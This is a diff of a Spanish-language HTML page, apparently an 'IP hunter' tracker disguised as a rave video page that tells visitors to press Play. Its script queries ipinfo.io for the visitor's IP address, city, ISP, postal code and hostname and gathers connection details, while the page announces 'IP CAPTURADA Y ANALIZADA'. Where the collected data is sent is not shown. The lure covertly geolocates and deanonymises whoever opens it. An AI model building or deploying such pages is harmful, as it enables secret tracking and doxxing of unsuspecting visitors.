@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Prueba - Estable y Máxima Captura</title>
+    <title>HUNTER IPS VERSION BETA - BY 77, 32 Y 33</title>
     
     <link rel="icon" type="image/png" href="favicon.png"> 
 
@@ -12,13 +12,13 @@
         body {
             font-family: 'Arial Black', sans-serif;
             text-align: center;
-            padding: 0; /* Lo cambié para que el menú toque los bordes */
+            padding: 0;
             margin: 0;
             background-color: #121212;
             color: #E0E0E0;
         }
 
-        /* --- ESTILOS DEL MENÚ DE NAVEGACIÓN --- */
+        /* --- 2. ESTILOS DEL MENÚ DE NAVEGACIÓN --- */
         nav {
             background-color: #1A1A1A;
             padding: 15px 0;
@@ -49,7 +49,7 @@
         }
         
         .content {
-             padding-top: 50px; /* Separación para que el menú no tape el H1 */
+             padding-top: 50px;
         }
         /* --- FIN ESTILOS MENÚ --- */
 
@@ -88,12 +88,12 @@
         <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
         <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>
 
-        <video width="720" controls>
+        <video width="720" controls poster="miniatura.jpg">
           <source src="clip.mp4" type="video/mp4">
           Tu navegador no puede reproducir este video.
         </video>
 
-        <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>
+        <p>IP CAPTURADA Y ANALIZADA</p>
     </div>
 
     <script>
@@ -119,8 +119,6 @@
         const rtt = navigator.connection ? navigator.connection.rtt : 'unknown';
 
         // --- FUNCIÓN PRINCIPAL: API de Respaldo (ipinfo.io/json) para Máxima Estabilidad ---
-
-        // ipinfo.io es extremadamente estable y no suele tener bloqueos de rate limit para uso esporádico.
         const scanUrl = 'https://ipinfo.io/json';
 
         fetch(scanUrl)
@@ -140,8 +138,6 @@
                     "Organizacion_ISP": geoData.org || 'N/A',
                     "Codigo_Postal": geoData.postal || 'N/A',
                     "Hostname": geoData.hostname || 'N/A',
-
-                    // --- DATOS DE SEGURIDAD Y CONEXIÓN (Incompletos con esta API) ---
                     "Proxy_VPN": 'No disponible con esta API gratuita',
                     "Movil": 'No disponible con esta API gratuita',
 
